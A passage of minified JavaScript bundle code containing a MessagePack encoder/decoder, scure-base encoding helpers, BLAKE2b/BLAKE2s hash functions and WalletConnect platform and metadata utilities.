t=e.length;this.ensureBufferSizeToWrite(t),this.bytes.set(e,this.pos),this.pos+=t}writeI8(e){this.ensureBufferSizeToWrite(1),this.view.setInt8(this.pos,e),this.pos++}writeU16(e){this.ensureBufferSizeToWrite(2),this.view.setUint16(this.pos,e),this.pos+=2}writeI16(e){this.ensureBufferSizeToWrite(2),this.view.setInt16(this.pos,e),this.pos+=2}writeU32(e){this.ensureBufferSizeToWrite(4),this.view.setUint32(this.pos,e),this.pos+=4}writeI32(e){this.ensureBufferSizeToWrite(4),this.view.setInt32(this.pos,e),this.pos+=4}writeF32(e){this.ensureBufferSizeToWrite(4),this.view.setFloat32(this.pos,e),this.pos+=4}writeF64(e){this.ensureBufferSizeToWrite(8),this.view.setFloat64(this.pos,e),this.pos+=8}writeU64(e){this.ensureBufferSizeToWrite(8),wLe(this.view,this.pos,e),this.pos+=8}writeI64(e){this.ensureBufferSizeToWrite(8),Gte(this.view,this.pos,e),this.pos+=8}writeBigUint64(e){this.ensureBufferSizeToWrite(8),this.view.setBigUint64(this.pos,e),this.pos+=8}writeBigInt64(e){this.ensureBufferSizeToWrite(8),this.view.setBigInt64(this.pos,e),this.pos+=8}}function PLe(r,e){return new pO(e).encodeSharedRef(r)}function ZA(r){return`${r<0?"-":""}0x${Math.abs(r).toString(16).padStart(2,"0")}`}const $Le=16,RLe=16;class OLe{constructor(e=$Le,t=RLe){this.hit=0,this.miss=0,this.maxKeyLength=e,this.maxLengthPerKey=t,this.caches=[];for(let i=0;i<this.maxKeyLength;i++)this.caches.push([])}canBeCached(e){return e>0&&e<=this.maxKeyLength}find(e,t,i){const n=this.caches[i-1];e:for(const s of n){const o=s.bytes;for(let a=0;a<i;a++)if(o[a]!==e[t+a])continue e;return s.str}return null}store(e,t){const i=this.caches[e.length-1],n={bytes:e,str:t};i.length>=this.maxLengthPerKey?i[Math.random()*i.length|0]=n:i.push(n)}decode(e,t,i){const n=this.find(e,t,i);if(n!=null)return this.hit++,n;this.miss++;const s=Kte(e,t,i),o=Uint8Array.prototype.slice.call(e,t,t+i);return this.store(o,s),s}}const yN="array",M5="map_key",Yte="map_value",BLe=r=>{if(typeof r=="string"||typeof r=="number")return r;throw new tc("The type of key must be string or number but "+typeof r)};class MLe{constructor(){this.stack=[],this.stackHeadPosition=-1}get length(){return this.stackHeadPosition+1}top(){return this.stack[this.stackHeadPosition]}pushArrayState(e){const t=this.getUninitializedStateFromPool();t.type=yN,t.position=0,t.size=e,t.array=new Array(e)}pushMapState(e){const t=this.getUninitializedStateFromPool();t.type=M5,t.readCount=0,t.size=e,t.map={}}getUninitializedStateFromPool(){if(this.stackHeadPosition++,this.stackHeadPosition===this.stack.length){const e={type:void 0,size:0,array:void 0,position:0,readCount:0,map:void 0,key:null};this.stack.push(e)}return this.stack[this.stackHeadPosition]}release(e){if(this.stack[this.stackHeadPosition]!==e)throw new Error("Invalid stack state. Released state is not on top of the stack.");if(e.type===yN){const i=e;i.size=0,i.array=void 0,i.position=0,i.type=void 0}if(e.type===M5||e.type===Yte){const i=e;i.size=0,i.map=void 0,i.readCount=0,i.type=void 0}this.stackHeadPosition--}reset(){this.stack.length=0,this.stackHeadPosition=-1}}const Nb=-1,gO=new DataView(new ArrayBuffer(0)),DLe=new Uint8Array(gO.buffer);try{gO.getInt8(0)}catch(r){if(!(r instanceof RangeError))throw new Error("This module is not supported in the current JavaScript engine because DataView does not throw RangeError on out-of-bounds access")}const Tz=new RangeError("Insufficient data"),LLe=new OLe;class mO{constructor(e){this.totalPos=0,this.pos=0,this.view=gO,this.bytes=DLe,this.headByte=Nb,this.stack=new MLe,this.entered=!1,this.extensionCodec=e?.extensionCodec??H7.defaultCodec,this.context=e?.context,this.useBigInt64=e?.useBigInt64??!1,this.rawStrings=e?.rawStrings??!1,this.maxStrLength=e?.maxStrLength??kb,this.maxBinLength=e?.maxBinLength??kb,this.maxArrayLength=e?.maxArrayLength??kb,this.maxMapLength=e?.maxMapLength??kb,this.maxExtLength=e?.maxExtLength??kb,this.keyDecoder=e?.keyDecoder!==void 0?e.keyDecoder:LLe,this.mapKeyConverter=e?.mapKeyConverter??BLe}clone(){return new mO({extensionCodec:this.extensionCodec,context:this.context,useBigInt64:this.useBigInt64,rawStrings:this.rawStrings,maxStrLength:this.maxStrLength,maxBinLength:this.maxBinLength,maxArrayLength:this.maxArrayLength,maxMapLength:this.maxMapLength,maxExtLength:this.maxExtLength,keyDecoder:this.keyDecoder})}reinitializeState(){this.totalPos=0,this.headByte=Nb,this.stack.reset()}setBuffer(e){const t=vN(e);this.bytes=t,this.view=new DataView(t.buffer,t.byteOffset,t.byteLength),this.pos=0}appendBuffer(e){if(this.headByte===Nb&&!this.hasRemaining(1))this.setBuffer(e);else{const t=this.bytes.subarray(this.pos),i=vN(e),n=new Uint8Array(t.length+i.length);n.set(t),n.set(i,t.length),this.setBuffer(n)}}hasRemaining(e){return this.view.byteLength-this.pos>=e}createExtraByteError(e){const{view:t,pos:i}=this;return new RangeError(`Extra ${t.byteLength-i} of ${t.byteLength} byte(s) found at buffer[${e}]`)}decode(e){if(this.entered)return this.clone().decode(e);try{this.entered=!0,this.reinitializeState(),this.setBuffer(e);const t=this.doDecodeSync();if(this.hasRemaining(1))throw this.createExtraByteError(this.pos);return t}finally{this.entered=!1}}*decodeMulti(e){if(this.entered){yield*this.clone().decodeMulti(e);return}try{for(this.entered=!0,this.reinitializeState(),this.setBuffer(e);this.hasRemaining(1);)yield this.doDecodeSync()}finally{this.entered=!1}}async decodeAsync(e){if(this.entered)return this.clone().decodeAsync(e);try{this.entered=!0;let t=!1,i;for await(const a of e){if(t)throw this.entered=!1,this.createExtraByteError(this.totalPos);this.appendBuffer(a);try{i=this.doDecodeSync(),t=!0}catch(c){if(!(c instanceof RangeError))throw c}this.totalPos+=this.pos}if(t){if(this.hasRemaining(1))throw this.createExtraByteError(this.totalPos);return i}const{headByte:n,pos:s,totalPos:o}=this;throw new RangeError(`Insufficient data in parsing ${ZA(n)} at ${o} (${s} in the current buffer)`)}finally{this.entered=!1}}decodeArrayStream(e){return this.decodeMultiAsync(e,!0)}decodeStream(e){return this.decodeMultiAsync(e,!1)}async*decodeMultiAsync(e,t){if(this.entered){yield*this.clone().decodeMultiAsync(e,t);return}try{this.entered=!0;let i=t,n=-1;for await(const s of e){if(t&&n===0)throw this.createExtraByteError(this.totalPos);this.appendBuffer(s),i&&(n=this.readArraySize(),i=!1,this.complete());try{for(;yield this.doDecodeSync(),--n!==0;);}catch(o){if(!(o instanceof RangeError))throw o}this.totalPos+=this.pos}}finally{this.entered=!1}}doDecodeSync(){e:for(;;){const e=this.readHeadByte();let t;if(e>=224)t=e-256;else if(e<192)if(e<128)t=e;else if(e<144){const n=e-128;if(n!==0){this.pushMapState(n),this.complete();continue e}else t={}}else if(e<160){const n=e-144;if(n!==0){this.pushArrayState(n),this.complete();continue e}else t=[]}else{const n=e-160;t=this.decodeString(n,0)}else if(e===192)t=null;else if(e===194)t=!1;else if(e===195)t=!0;else if(e===202)t=this.readF32();else if(e===203)t=this.readF64();else if(e===204)t=this.readU8();else if(e===205)t=this.readU16();else if(e===206)t=this.readU32();else if(e===207)this.useBigInt64?t=this.readU64AsBigInt():t=this.readU64();else if(e===208)t=this.readI8();else if(e===209)t=this.readI16();else if(e===210)t=this.readI32();else if(e===211)this.useBigInt64?t=this.readI64AsBigInt():t=this.readI64();else if(e===217){const n=this.lookU8();t=this.decodeString(n,1)}else if(e===218){const n=this.lookU16();t=this.decodeString(n,2)}else if(e===219){const n=this.lookU32();t=this.decodeString(n,4)}else if(e===220){const n=this.readU16();if(n!==0){this.pushArrayState(n),this.complete();continue e}else t=[]}else if(e===221){const n=this.readU32();if(n!==0){this.pushArrayState(n),this.complete();continue e}else t=[]}else if(e===222){const n=this.readU16();if(n!==0){this.pushMapState(n),this.complete();continue e}else t={}}else if(e===223){const n=this.readU32();if(n!==0){this.pushMapState(n),this.complete();continue e}else t={}}else if(e===196){const n=this.lookU8();t=this.decodeBinary(n,1)}else if(e===197){const n=this.lookU16();t=this.decodeBinary(n,2)}else if(e===198){const n=this.lookU32();t=this.decodeBinary(n,4)}else if(e===212)t=this.decodeExtension(1,0);else if(e===213)t=this.decodeExtension(2,0);else if(e===214)t=this.decodeExtension(4,0);else if(e===215)t=this.decodeExtension(8,0);else if(e===216)t=this.decodeExtension(16,0);else if(e===199){const n=this.lookU8();t=this.decodeExtension(n,1)}else if(e===200){const n=this.lookU16();t=this.decodeExtension(n,2)}else if(e===201){const n=this.lookU32();t=this.decodeExtension(n,4)}else throw new tc(`Unrecognized type byte: ${ZA(e)}`);this.complete();const i=this.stack;for(;i.length>0;){const n=i.top();if(n.type===yN)if(n.array[n.position]=t,n.position++,n.position===n.size)t=n.array,i.release(n);else continue e;else if(n.type===M5){if(t==="__proto__")throw new tc("The key __proto__ is not allowed");n.key=this.mapKeyConverter(t),n.type=Yte;continue e}else if(n.map[n.key]=t,n.readCount++,n.readCount===n.size)t=n.map,i.release(n);else{n.key=null,n.type=M5;continue e}}return t}}readHeadByte(){return this.headByte===Nb&&(this.headByte=this.readU8()),this.headByte}complete(){this.headByte=Nb}readArraySize(){const e=this.readHeadByte();switch(e){case 220:return this.readU16();case 221:return this.readU32();default:{if(e<160)return e-144;throw new tc(`Unrecognized array type byte: ${ZA(e)}`)}}}pushMapState(e){if(e>this.maxMapLength)throw new tc(`Max length exceeded: map length (${e}) > maxMapLengthLength (${this.maxMapLength})`);this.stack.pushMapState(e)}pushArrayState(e){if(e>this.maxArrayLength)throw new tc(`Max length exceeded: array length (${e}) > maxArrayLength (${this.maxArrayLength})`);this.stack.pushArrayState(e)}decodeString(e,t){return!this.rawStrings||this.stateIsMapKey()?this.decodeUtf8String(e,t):this.decodeBinary(e,t)}decodeUtf8String(e,t){if(e>this.maxStrLength)throw new tc(`Max length exceeded: UTF-8 byte length (${e}) > maxStrLength (${this.maxStrLength})`);if(this.bytes.byteLength<this.pos+t+e)throw Tz;const i=this.pos+t;let n;return this.stateIsMapKey()&&this.keyDecoder?.canBeCached(e)?n=this.keyDecoder.decode(this.bytes,i,e):n=mLe(this.bytes,i,e),this.pos+=t+e,n}stateIsMapKey(){return this.stack.length>0?this.stack.top().type===M5:!1}decodeBinary(e,t){if(e>this.maxBinLength)throw new tc(`Max length exceeded: bin length (${e}) > maxBinLength (${this.maxBinLength})`);if(!this.hasRemaining(e+t))throw Tz;const i=this.pos+t,n=this.bytes.subarray(i,i+e);return this.pos+=t+e,n}decodeExtension(e,t){if(e>this.maxExtLength)throw new tc(`Max length exceeded: ext length (${e}) > maxExtLength (${this.maxExtLength})`);const i=this.view.getInt8(this.pos+t),n=this.decodeBinary(e,t+1);return this.extensionCodec.decode(n,i,this.context)}lookU8(){return this.view.getUint8(this.pos)}lookU16(){return this.view.getUint16(this.pos)}lookU32(){return this.view.getUint32(this.pos)}readU8(){const e=this.view.getUint8(this.pos);return this.pos++,e}readI8(){const e=this.view.getInt8(this.pos);return this.pos++,e}readU16(){const e=this.view.getUint16(this.pos);return this.pos+=2,e}readI16(){const e=this.view.getInt16(this.pos);return this.pos+=2,e}readU32(){const e=this.view.getUint32(this.pos);return this.pos+=4,e}readI32(){const e=this.view.getInt32(this.pos);return this.pos+=4,e}readU64(){const e=bLe(this.view,this.pos);return this.pos+=8,e}readI64(){const e=Zte(this.view,this.pos);return this.pos+=8,e}readU64AsBigInt(){const e=this.view.getBigUint64(this.pos);return this.pos+=8,e}readI64AsBigInt(){const e=this.view.getBigInt64(this.pos);return this.pos+=8,e}readF32(){const e=this.view.getFloat32(this.pos);return this.pos+=4,e}readF64(){const e=this.view.getFloat64(this.pos);return this.pos+=8,e}}function ULe(r,e){return new mO(e).decode(r)}/*! scure-base - MIT License (c) 2022 Paul Miller (paulmillr.com) */function jLe(r){return r instanceof Uint8Array||ArrayBuffer.isView(r)&&r.constructor.name==="Uint8Array"}function Jte(r,e){return Array.isArray(e)?e.length===0?!0:r?e.every(t=>typeof t=="string"):e.every(t=>Number.isSafeInteger(t)):!1}function V7(r,e){if(typeof e!="string")throw new Error(`${r}: string expected`);return!0}function wO(r){if(!Number.isSafeInteger(r))throw new Error(`invalid integer: ${r}`)}function xN(r){if(!Array.isArray(r))throw new Error("array expected")}function K7(r,e){if(!Jte(!0,e))throw new Error(`${r}: array of strings expected`)}function FLe(r,e){if(!Jte(!1,e))throw new Error(`${r}: array of numbers expected`)}function qLe(...r){const e=s=>s,t=(s,o)=>a=>s(o(a)),i=r.map(s=>s.encode).reduceRight(t,e),n=r.map(s=>s.decode).reduce(t,e);return{encode:i,decode:n}}function zLe(r){const e=typeof r=="string"?r.split(""):r,t=e.length;K7("alphabet",e);const i=new Map(e.map((n,s)=>[n,s]));return{encode:n=>(xN(n),n.map(s=>{if(!Number.isSafeInteger(s)||s<0||s>=t)throw new Error(`alphabet.encode: digit index outside alphabet "${s}". Allowed: ${r}`);return e[s]})),decode:n=>(xN(n),n.map(s=>{V7("alphabet.decode",s);const o=i.get(s);if(o===void 0)throw new Error(`Unknown letter: "${s}". Allowed: ${r}`);return o}))}}function WLe(r=""){return V7("join",r),{encode:e=>(K7("join.decode",e),e.join(r)),decode:e=>(V7("join.decode",e),e.split(r))}}function HLe(r,e="="){return wO(r),V7("padding",e),{encode(t){for(K7("padding.encode",t);t.length*r%8;)t.push(e);return t},decode(t){K7("padding.decode",t);let i=t.length;if(i*r%8)throw new Error("padding: invalid, string should have whole number of bytes");for(;i>0&&t[i-1]===e;i--)if((i-1)*r%8===0)throw new Error("padding: invalid, string has too much padding");return t.slice(0,i)}}}const Qte=(r,e)=>e===0?r:Qte(e,r%e),G7=(r,e)=>r+(e-Qte(r,e)),YA=(()=>{let r=[];for(let e=0;e<40;e++)r.push(2**e);return r})();function kz(r,e,t,i){if(xN(r),e<=0||e>32)throw new Error(`convertRadix2: wrong from=${e}`);if(t<=0||t>32)throw new Error(`convertRadix2: wrong to=${t}`);if(G7(e,t)>32)throw new Error(`convertRadix2: carry overflow from=${e} to=${t} carryBits=${G7(e,t)}`);let n=0,s=0;const o=YA[e],a=YA[t]-1,c=[];for(const l of r){if(wO(l),l>=o)throw new Error(`convertRadix2: invalid data word=${l} from=${e}`);if(n=n<<e|l,s+e>32)throw new Error(`convertRadix2: carry overflow pos=${s} from=${e}`);for(s+=e;s>=t;s-=t)c.push((n>>s-t&a)>>>0);const u=YA[s];if(u===void 0)throw new Error("invalid carry");n&=u-1}if(n=n<<t-s&a,!i&&s>=e)throw new Error("Excess padding");if(!i&&n>0)throw new Error(`Non-zero padding: ${n}`);return i&&s>0&&c.push(n>>>0),c}function VLe(r,e=!1){if(wO(r),r<=0||r>32)throw new Error("radix2: bits should be in (0..32]");if(G7(8,r)>32||G7(r,8)>32)throw new Error("radix2: carry overflow");return{encode:t=>{if(!jLe(t))throw new Error("radix2.encode input should be Uint8Array");return kz(Array.from(t),8,r,!e)},decode:t=>(FLe("radix2.decode",t),Uint8Array.from(kz(t,r,8,e)))}}const KLe=qLe(VLe(5),zLe("ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"),HLe(5),WLe(""));function bO(r){return globalThis.Buffer!=null?new Uint8Array(r.buffer,r.byteOffset,r.byteLength):r}function Xte(r=0){return globalThis.Buffer!=null&&globalThis.Buffer.allocUnsafe!=null?bO(globalThis.Buffer.allocUnsafe(r)):new Uint8Array(r)}function D5(r,e){e||(e=r.reduce((n,s)=>n+s.length,0));const t=Xte(e);let i=0;for(const n of r)t.set(n,i),i+=n.length;return bO(t)}function ere(r,e,t,i){return{name:r,prefix:e,encoder:{name:r,prefix:e,encode:t},decoder:{decode:i}}}const Nz=ere("utf8","u",r=>"u"+new TextDecoder("utf8").decode(r),r=>new TextEncoder().encode(r.substring(1))),JA=ere("ascii","a",r=>{let e="a";for(let t=0;t<r.length;t++)e+=String.fromCharCode(r[t]);return e},r=>{r=r.substring(1);const e=Xte(r.length);for(let t=0;t<r.length;t++)e[t]=r.charCodeAt(t);return e}),tre={utf8:Nz,"utf-8":Nz,hex:o7.base16,latin1:JA,ascii:JA,binary:JA,...o7};function tl(r,e="utf8"){const t=tre[e];if(!t)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?bO(globalThis.Buffer.from(r,"utf-8")):t.decoder.decode(`${t.prefix}${r}`)}function $a(r,e="utf8"){const t=tre[e];if(!t)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?globalThis.Buffer.from(r.buffer,r.byteOffset,r.byteLength).toString("utf8"):t.encoder.encode(r).substring(1)}var QA,Pz;function rre(){if(Pz)return QA;Pz=1;const r="Input must be an string, Buffer or Uint8Array";function e(o){let a;if(o instanceof Uint8Array)a=o;else if(typeof o=="string")a=new TextEncoder().encode(o);else throw new Error(r);return a}function t(o){return Array.prototype.map.call(o,function(a){return(a<16?"0":"")+a.toString(16)}).join("")}function i(o){return(4294967296+o).toString(16).substring(1)}function n(o,a,c){let l=`
`+o+" = ";for(let u=0;u<a.length;u+=2){if(c===32)l+=i(a[u]).toUpperCase(),l+=" ",l+=i(a[u+1]).toUpperCase();else if(c===64)l+=i(a[u+1]).toUpperCase(),l+=i(a[u]).toUpperCase();else throw new Error("Invalid size "+c);u%6===4?l+=`
`+new Array(o.length+4).join(" "):u<a.length-2&&(l+=" ")}console.log(l)}function s(o,a,c){let l=new Date().getTime();const u=new Uint8Array(a);for(let h=0;h<a;h++)u[h]=h%256;const d=new Date().getTime();console.log("Generated random input in "+(d-l)+"ms"),l=d;for(let h=0;h<c;h++){const f=o(u),p=new Date().getTime(),g=p-l;l=p,console.log("Hashed in "+g+"ms: "+f.substring(0,20)+"..."),console.log(Math.round(a/(1<<20)/(g/1e3)*100)/100+" MB PER SECOND")}}return QA={normalizeInput:e,toHex:t,debugPrint:n,testSpeed:s},QA}var XA,$z;function GLe(){if($z)return XA;$z=1;const r=rre();function e(m,x,S){const T=m[x]+m[S];let k=m[x+1]+m[S+1];T>=4294967296&&k++,m[x]=T,m[x+1]=k}function t(m,x,S,T){let k=m[x]+S;S<0&&(k+=4294967296);let I=m[x+1]+T;k>=4294967296&&I++,m[x]=k,m[x+1]=I}function i(m,x){return m[x]^m[x+1]<<8^m[x+2]<<16^m[x+3]<<24}function n(m,x,S,T,k,I){const E=l[k],C=l[k+1],N=l[I],L=l[I+1];e(c,m,x),t(c,m,E,C);let $=c[T]^c[m],y=c[T+1]^c[m+1];c[T]=y,c[T+1]=$,e(c,S,T),$=c[x]^c[S],y=c[x+1]^c[S+1],c[x]=$>>>24^y<<8,c[x+1]=y>>>24^$<<8,e(c,m,x),t(c,m,N,L),$=c[T]^c[m],y=c[T+1]^c[m+1],c[T]=$>>>16^y<<16,c[T+1]=y>>>16^$<<16,e(c,S,T),$=c[x]^c[S],y=c[x+1]^c[S+1],c[x]=y>>>31^$<<1,c[x+1]=$>>>31^y<<1}const s=new Uint32Array([4089235720,1779033703,2227873595,3144134277,4271175723,1013904242,1595750129,2773480762,2917565137,1359893119,725511199,2600822924,4215389547,528734635,327033209,1541459225]),o=[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,14,10,4,8,9,15,13,6,1,12,0,2,11,7,5,3,11,8,12,0,5,2,15,13,10,14,3,6,7,1,9,4,7,9,3,1,13,12,11,14,2,6,5,10,4,0,15,8,9,0,5,7,2,4,10,15,14,1,11,12,6,8,3,13,2,12,6,10,0,11,8,3,4,13,7,5,15,14,1,9,12,5,1,15,14,13,4,10,0,7,6,3,9,2,8,11,13,11,7,14,12,1,3,9,5,0,15,4,8,6,2,10,6,15,14,9,11,3,0,8,12,2,13,7,1,4,10,5,10,2,8,4,7,6,1,5,15,11,9,14,3,12,13,0,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,14,10,4,8,9,15,13,6,1,12,0,2,11,7,5,3],a=new Uint8Array(o.map(function(m){return m*2})),c=new Uint32Array(32),l=new Uint32Array(32);function u(m,x){let S=0;for(S=0;S<16;S++)c[S]=m.h[S],c[S+16]=s[S];for(c[24]=c[24]^m.t,c[25]=c[25]^m.t/4294967296,x&&(c[28]=~c[28],c[29]=~c[29]),S=0;S<32;S++)l[S]=i(m.b,4*S);for(S=0;S<12;S++)n(0,8,16,24,a[S*16+0],a[S*16+1]),n(2,10,18,26,a[S*16+2],a[S*16+3]),n(4,12,20,28,a[S*16+4],a[S*16+5]),n(6,14,22,30,a[S*16+6],a[S*16+7]),n(0,10,20,30,a[S*16+8],a[S*16+9]),n(2,12,22,24,a[S*16+10],a[S*16+11]),n(4,14,16,26,a[S*16+12],a[S*16+13]),n(6,8,18,28,a[S*16+14],a[S*16+15]);for(S=0;S<16;S++)m.h[S]=m.h[S]^c[S]^c[S+16]}const d=new Uint8Array([0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]);function h(m,x,S,T){if(m===0||m>64)throw new Error("Illegal output length, expected 0 < length <= 64");if(x&&x.length>64)throw new Error("Illegal key, expected Uint8Array with 0 < length <= 64");if(S&&S.length!==16)throw new Error("Illegal salt, expected Uint8Array with length is 16");if(T&&T.length!==16)throw new Error("Illegal personal, expected Uint8Array with length is 16");const k={b:new Uint8Array(128),h:new Uint32Array(16),t:0,c:0,outlen:m};d.fill(0),d[0]=m,x&&(d[1]=x.length),d[2]=1,d[3]=1,S&&d.set(S,32),T&&d.set(T,48);for(let I=0;I<16;I++)k.h[I]=s[I]^i(d,I*4);return x&&(f(k,x),k.c=128),k}function f(m,x){for(let S=0;S<x.length;S++)m.c===128&&(m.t+=m.c,u(m,!1),m.c=0),m.b[m.c++]=x[S]}function p(m){for(m.t+=m.c;m.c<128;)m.b[m.c++]=0;u(m,!0);const x=new Uint8Array(m.outlen);for(let S=0;S<m.outlen;S++)x[S]=m.h[S>>2]>>8*(S&3);return x}function g(m,x,S,T,k){S=S||64,m=r.normalizeInput(m),T&&(T=r.normalizeInput(T)),k&&(k=r.normalizeInput(k));const I=h(S,x,T,k);return f(I,m),p(I)}function w(m,x,S,T,k){const I=g(m,x,S,T,k);return r.toHex(I)}return XA={blake2b:g,blake2bHex:w,blake2bInit:h,blake2bUpdate:f,blake2bFinal:p},XA}var eI,Rz;function ZLe(){if(Rz)return eI;Rz=1;const r=rre();function e(p,g){return p[g]^p[g+1]<<8^p[g+2]<<16^p[g+3]<<24}function t(p,g,w,m,x,S){o[p]=o[p]+o[g]+x,o[m]=i(o[m]^o[p],16),o[w]=o[w]+o[m],o[g]=i(o[g]^o[w],12),o[p]=o[p]+o[g]+S,o[m]=i(o[m]^o[p],8),o[w]=o[w]+o[m],o[g]=i(o[g]^o[w],7)}function i(p,g){return p>>>g^p<<32-g}const n=new Uint32Array([1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225]),s=new Uint8Array([0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,14,10,4,8,9,15,13,6,1,12,0,2,11,7,5,3,11,8,12,0,5,2,15,13,10,14,3,6,7,1,9,4,7,9,3,1,13,12,11,14,2,6,5,10,4,0,15,8,9,0,5,7,2,4,10,15,14,1,11,12,6,8,3,13,2,12,6,10,0,11,8,3,4,13,7,5,15,14,1,9,12,5,1,15,14,13,4,10,0,7,6,3,9,2,8,11,13,11,7,14,12,1,3,9,5,0,15,4,8,6,2,10,6,15,14,9,11,3,0,8,12,2,13,7,1,4,10,5,10,2,8,4,7,6,1,5,15,11,9,14,3,12,13,0]),o=new Uint32Array(16),a=new Uint32Array(16);function c(p,g){let w=0;for(w=0;w<8;w++)o[w]=p.h[w],o[w+8]=n[w];for(o[12]^=p.t,o[13]^=p.t/4294967296,g&&(o[14]=~o[14]),w=0;w<16;w++)a[w]=e(p.b,4*w);for(w=0;w<10;w++)t(0,4,8,12,a[s[w*16+0]],a[s[w*16+1]]),t(1,5,9,13,a[s[w*16+2]],a[s[w*16+3]]),t(2,6,10,14,a[s[w*16+4]],a[s[w*16+5]]),t(3,7,11,15,a[s[w*16+6]],a[s[w*16+7]]),t(0,5,10,15,a[s[w*16+8]],a[s[w*16+9]]),t(1,6,11,12,a[s[w*16+10]],a[s[w*16+11]]),t(2,7,8,13,a[s[w*16+12]],a[s[w*16+13]]),t(3,4,9,14,a[s[w*16+14]],a[s[w*16+15]]);for(w=0;w<8;w++)p.h[w]^=o[w]^o[w+8]}function l(p,g){if(!(p>0&&p<=32))throw new Error("Incorrect output length, should be in [1, 32]");const w=g?g.length:0;if(g&&!(w>0&&w<=32))throw new Error("Incorrect key length, should be in [1, 32]");const m={h:new Uint32Array(n),b:new Uint8Array(64),c:0,t:0,outlen:p};return m.h[0]^=16842752^w<<8^p,w>0&&(u(m,g),m.c=64),m}function u(p,g){for(let w=0;w<g.length;w++)p.c===64&&(p.t+=p.c,c(p,!1),p.c=0),p.b[p.c++]=g[w]}function d(p){for(p.t+=p.c;p.c<64;)p.b[p.c++]=0;c(p,!0);const g=new Uint8Array(p.outlen);for(let w=0;w<p.outlen;w++)g[w]=p.h[w>>2]>>8*(w&3)&255;return g}function h(p,g,w){w=w||32,p=r.normalizeInput(p);const m=l(w,g);return u(m,p),d(m)}function f(p,g,w){const m=h(p,g,w);return r.toHex(m)}return eI={blake2s:h,blake2sHex:f,blake2sInit:l,blake2sUpdate:u,blake2sFinal:d},eI}var tI,Oz;function YLe(){if(Oz)return tI;Oz=1;const r=GLe(),e=ZLe();return tI={blake2b:r.blake2b,blake2bHex:r.blake2bHex,blake2bInit:r.blake2bInit,blake2bUpdate:r.blake2bUpdate,blake2bFinal:r.blake2bFinal,blake2s:e.blake2s,blake2sHex:e.blake2sHex,blake2sInit:e.blake2sInit,blake2sUpdate:e.blake2sUpdate,blake2sFinal:e.blake2sFinal},tI}var JLe=YLe(),QLe={};const XLe=":";function uw(r){const[e,t]=r.split(XLe);return{namespace:e,reference:t}}function Bz(r,e=[]){const t=[];return Object.keys(r).forEach(i=>{if(e.length&&!e.includes(i))return;const n=r[i];t.push(...n.accounts)}),t}function ire(r,e){return r.includes(":")?[r]:e.chains||[]}var eUe=Object.defineProperty,tUe=Object.defineProperties,rUe=Object.getOwnPropertyDescriptors,Mz=Object.getOwnPropertySymbols,iUe=Object.prototype.hasOwnProperty,nUe=Object.prototype.propertyIsEnumerable,CN=(r,e,t)=>e in r?eUe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,Dz=(r,e)=>{for(var t in e||(e={}))iUe.call(e,t)&&CN(r,t,e[t]);if(Mz)for(var t of Mz(e))nUe.call(e,t)&&CN(r,t,e[t]);return r},sUe=(r,e)=>tUe(r,rUe(e)),Lz=(r,e,t)=>CN(r,typeof e!="symbol"?e+"":e,t);const oUe="ReactNative",uc={reactNative:"react-native",node:"node",browser:"browser",unknown:"unknown"},aUe="js";function Z7(){return typeof process<"u"&&typeof process.versions<"u"&&typeof process.versions.node<"u"}function Bp(){return!vn.getDocument()&&!!vn.getNavigator()&&navigator.product===oUe}function cUe(){return Bp()&&typeof global<"u"&&typeof(global==null?void 0:global.Platform)<"u"&&(global==null?void 0:global.Platform.OS)==="android"}function lUe(){return Bp()&&typeof global<"u"&&typeof(global==null?void 0:global.Platform)<"u"&&(global==null?void 0:global.Platform.OS)==="ios"}function L3(){return!Z7()&&!!vn.getNavigator()&&!!vn.getDocument()}function z4(){return Bp()?uc.reactNative:Z7()?uc.node:L3()?uc.browser:uc.unknown}function Uz(){var r;try{return Bp()&&typeof global<"u"&&typeof(global==null?void 0:global.Application)<"u"?(r=global.Application)==null?void 0:r.applicationId:void 0}catch{return}}function uUe(r,e){const t=new URLSearchParams(r);for(const i of Object.keys(e).sort())if(e.hasOwnProperty(i)){const n=e[i];n!==void 0&&t.set(i,n)}return t.toString()}function dUe(r){var e,t;const i=nre();try{return r!=null&&r.url&&i.url&&new URL(r.url).host!==new URL(i.url).host&&(console.warn(`The configured WalletConnect 'metadata.url':${r.url} differs from the actual page url:${i.url}. This is probably unintended and can lead to issues.`),r.url=i.url),(e=r?.icons)!=null&&e.length&&r.icons.length>0&&(r.icons=r.icons.filter(n=>n!=="")),sUe(Dz(Dz({},i),r),{url:r?.url||i.url,name:r?.name||i.name,description:r?.description||i.description,icons:(t=r?.icons)!=null&&t.length&&r.icons.length>0?r.icons:i.icons})}catch(n){return console.warn("Error populating app metadata",n),r||i}}function nre(){return oR.getWindowMetadata()||{name:"",description:"",url:"",icons:[""]}}function hUe(){if(z4()===uc.reactNative&&typeof global<"u"&&typeof(global==null?void 0:global.Platform)<"u"){const{OS:t,Version:i}=global.Platform;return[t,i].join("-")}const r=sR();if(r===null)return"unknown";const e=r.os?r.os.replace(" ","").toLowerCase():"unknown";return r.type==="browser"?[e,r.name,r.version].join("-"):[e,r.version].join("-")}function fUe(){var r;const e=z4();return e===uc.browser?[e,((r=vn.getLocation())==null?void 0:r.host)||"unknown"].join(":"):e}function sre(r,e,t){const i=hUe(),n=fUe();return[[r,e].join("-"),[aUe,t].join("-"),i,n].join("/")}function pUe({protocol:r,version:e,relayUrl:t,sdkVersion:i,auth:n,projectId:s,useOnCloseEvent:o,bundleId:a,packageName:c}){const l=t.split("?"),u=sre(r,e,i),d={auth:n,ua:u,projectId:s,useOnCloseEvent:o,packageName:c||void 0,bundleId:a||void 0},h=uUe(l[1]||"",d);return l[0]+"?"+h}function S1(r,e){return r.filter(t=>e.includes(t)).length===r.length}function EN(r){return Object.fromEntries(r.entries())}function _N(r){return 